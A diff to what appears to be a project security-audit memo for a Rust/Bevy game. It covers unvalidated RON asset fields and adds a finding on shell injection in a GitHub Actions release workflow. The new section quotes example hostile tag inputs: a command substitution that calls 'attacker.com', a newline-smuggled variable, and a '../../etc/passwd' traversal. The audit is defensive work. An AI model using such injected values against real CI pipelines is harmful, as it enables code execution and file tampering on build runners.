@@ -4,7 +4,7 @@ description: Confirmed safe RON deserialization patterns and production panic su
 type: project
 ---
 
-Audited 2026-03-19 (develop, commit 7256360). Updated 2026-03-20 (feature/overclock-trigger-chain) to add chip/overclock RON patterns. Updated 2026-03-21 (develop, post-SpeedBoost refactor) to add SpeedBoost.multiplier finding. Updated 2026-03-21 (feature/invariant-self-tests) to add new scenario runner debug fields. Updated 2026-03-22 (feature/wave-3-offerings-transitions) to add Wave 3 transition config and chip offering weight findings.
+Audited 2026-03-19 (develop, commit 7256360). Updated 2026-03-20 (feature/overclock-trigger-chain) to add chip/overclock RON patterns. Updated 2026-03-21 (develop, post-SpeedBoost refactor) to add SpeedBoost.multiplier finding. Updated 2026-03-21 (feature/invariant-self-tests) to add new scenario runner debug fields. Updated 2026-03-22 (feature/wave-3-offerings-transitions) to add Wave 3 transition config and chip offering weight findings. Updated 2026-03-23 (Wave 4 audit) to add EvolutionRecipe/EvolutionIngredient findings and CI workflow finding.
 
 ## Summary
 
@@ -41,7 +41,7 @@ without bounds checks in the asset loader path. A `.cell.ron` with `hp: -1.0` or
 `regen_rate: Some(999999.0)` would load silently and cause downstream logic issues. Test code
 validates `hp > 0.0` but only in `#[cfg(test)]`.
 
-**Status as of 2026-03-20 audit:** Still unvalidated. No runtime validation added yet.
+**Status as of 2026-03-23 audit:** Still unvalidated. No runtime validation added yet.
 
 **How to apply:** On future audits, check whether validation has been added to the runtime
 asset-loaded path (the system that processes `CellTypeAsset` events and populates `CellTypeRegistry`).
@@ -60,7 +60,7 @@ Concrete risks:
   negative (`BASE_BOLT_DAMAGE * (1 + (-2.0)) < 0`), which heals cells via `take_damage`. Cells
   with `hp = max` would never be destroyed — node completion impossible.
 
-**Status as of 2026-03-20:** All unvalidated. First-party data only, no external input path.
+**Status as of 2026-03-23:** All unvalidated. First-party data only, no external input path.
 OnPerfectBump → OnImpact nesting means deeply nested chains are author-controlled. RON parser
 recursion limit (~128) provides a practical cap on chain depth.
 
@@ -84,7 +84,7 @@ Concrete risks:
 - `multiplier: 1e10` hits the `max_speed` clamp and is safe (no panic, no NaN). Max-speed clamp
   path is exercised by test `handle_speed_boost_clamps_to_max_speed`.
 
-**Status as of 2026-03-21:** Unvalidated. First-party data only. All production RON files use
+**Status as of 2026-03-23:** Unvalidated. First-party data only. All production RON files use
 safe positive values (1.1, 1.5). The zero-velocity path is explicitly covered by test
 `handle_speed_boost_zero_velocity_remains_zero` and does not panic. Scenario invariant
 `BoltSpeedInRange` would catch a motionless bolt at runtime.
@@ -103,7 +103,7 @@ New fields in `DebugSetup` and `MutationKind` (scenario runner only, not game cr
 All of these are in the scenario runner developer tool — `.scenario.ron` files are first-party only.
 No runtime user input path. Acceptable risk identical to prior TriggerChain stacking fields.
 
-**Status as of 2026-03-21:** Unvalidated. First-party data only. Same category as TriggerChain stacking fields.
+**Status as of 2026-03-23:** Unvalidated. First-party data only. Same category as TriggerChain stacking fields.
 
 **How to apply:** On future audits, verify no external path to `.scenario.ron` loading has been added
 (e.g., a flag to load a scenario from an arbitrary filesystem path provided by the user).
@@ -132,7 +132,7 @@ defaults). There is no `.transition.ron` file in assets/ and no asset path in `D
 The RON deserialization risk is **latent** — it would only become active if someone adds a
 `defaults.transition.ron` asset path in the future.
 
-**Status as of 2026-03-22:** Unvalidated but latent — no RON file loaded at runtime. The divide-
+**Status as of 2026-03-23:** Unvalidated but latent — no RON file loaded at runtime. The divide-
 by-zero path in `animate_transition` is a real risk if a transition RON config file is ever added.
 
 **How to apply:** On future audits, check whether `TransitionDefaults` has been added to
@@ -165,10 +165,63 @@ Concrete risks:
 - `seen_decay_factor: 2.0` (> 1.0) — amplifies weight of seen chips rather than decaying. A
   chip offered many times would become increasingly likely. Authored foot-gun but no panic.
 
-**Status as of 2026-03-22:** Unvalidated, but no production RON includes these fields — all use
+**Status as of 2026-03-23:** Unvalidated, but no production RON includes these fields — all use
 `#[serde(default)]` defaults. The offering algorithm gracefully handles all degenerate inputs
 (empty pool, zero weights, `count > pool.len()`). Lower security priority than prior findings.
 
 **How to apply:** On future audits, check if the new weight fields have been added to
 `defaults.chipselect.ron`. If so, verify they include authoring guidance (positive, <= 1.0 for
 decay) to prevent foot-guns.
+
+## Wave 4: EvolutionIngredient.stacks_required — no bounds validation (added 2026-03-23)
+
+`EvolutionIngredient.stacks_required: u32` is deserialized from `.chip.ron` / `.evolution.ron`
+files (loaded as a `Bevy Asset` via `EvolutionRecipe`) without any bounds check.
+
+Concrete risks:
+- `stacks_required: 0` — `eligible_evolutions()` checks `inventory.stacks(name) >= 0`, which is
+  always true for a `u32`. Any recipe with a zero-stack ingredient is permanently eligible,
+  regardless of inventory state. The evolution can be triggered for "free" with no ingredients held.
+  The consumption loop in `handle_chip_input.rs:77` iterates `0..0`, does nothing, and removes no
+  stacks. This is a silent authoring error, not a panic.
+- `stacks_required: u32::MAX` — `eligible_evolutions` would require the player to hold
+  `u32::MAX` stacks of a chip, which is impossible (chip max_stacks is also u32 but bounded by
+  design). The recipe would never appear as eligible. No panic, just an unreachable recipe.
+
+No `.evolution.ron` files exist in `assets/` yet. The `EvolutionRegistry` is populated entirely
+from test code at this time. Risk is latent until authored evolution RON files are added.
+
+**Status as of 2026-03-23:** Unvalidated. No production evolution RON files exist. Latent risk.
+
+**How to apply:** On future audits, check if `.evolution.ron` files have been added to assets/.
+If so, verify `stacks_required > 0` is either enforced in the asset loader or documented as an
+authoring constraint.
+
+## Wave 4: CI release workflow — workflow_dispatch tag input injection risk (added 2026-03-23)
+
+In `.github/workflows/release.yml`, the `resolve-tag` job runs a bash script that directly
+interpolates `${{ github.event.inputs.tag }}` into a `run:` shell command:
+
+```yaml
+echo "tag=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"
+```
+
+This pattern is a known GitHub Actions injection vector. If the tag input contains shell
+metacharacters (e.g., `v1.0.0$(curl attacker.com)` or `v1.0.0\nAPPROVED=true`), the expression
+is evaluated as shell code before being written to `$GITHUB_OUTPUT`.
+
+However, for this repo:
+- `workflow_dispatch` is a manually triggered event — only repository collaborators with write
+  access can trigger it. There is no public/unauthenticated input path.
+- The tag is then used as a shell variable `$TAG` (not re-interpolated as `${{ ... }}`) in all
+  downstream steps, which is safe.
+- The primary concrete risk is path traversal via the tag used in artifact directory names
+  (e.g., `breaker-${{ env.TAG }}-macos-arm64`). A tag like `../../etc/passwd` would cause
+  `mkdir -p`, `cp`, and `zip` to operate on unexpected paths. In practice, `workflow_dispatch`
+  is restricted to write-access users.
+
+**Status as of 2026-03-23:** Low risk given restricted trigger access. The fix would be to quote
+the input and validate it matches `v*` pattern before use.
+
+**How to apply:** On future audits, verify whether the workflow has been updated to validate the
+tag input format (e.g., `if [[ ! "$TAG" =~ ^v[0-9] ]]; then exit 1; fi`).
